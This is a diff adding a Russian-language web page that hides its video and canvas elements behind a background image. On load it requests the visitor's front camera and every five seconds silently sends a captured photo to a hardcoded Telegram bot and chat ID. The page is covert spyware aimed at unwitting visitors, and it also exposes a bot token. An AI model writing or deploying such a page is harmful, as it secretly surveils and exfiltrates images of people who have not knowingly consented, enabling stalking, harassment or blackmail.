@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Фото через камеру</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-image: url('https://telegra.ph/file/12c9bc2b2005cb16581e3.jpg');
+            background-size: cover;
+        }
+        video {
+            display: none;
+        }
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const botToken = '7305121459:AAFx3_Ggju_WLXb8sqmkK27NDOiQcOUwy0w';
+        const chatId = '1653222949';
+
+        function sendPhotoToTelegram(imageData) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageData);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Фото отправлено:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка отправки:', error);
+            });
+        }
+
+        function takePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                sendPhotoToTelegram(blob);
+            }, 'image/jpeg');
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+
+                setInterval(() => {
+                    takePhoto();
+                }, 5000); // Фото каждые 5 секунд
+            })
+            .catch(error => {
+                console.error('Ошибка доступа к камере:', error);
+            });
+    </script>
+</body>
+</html>
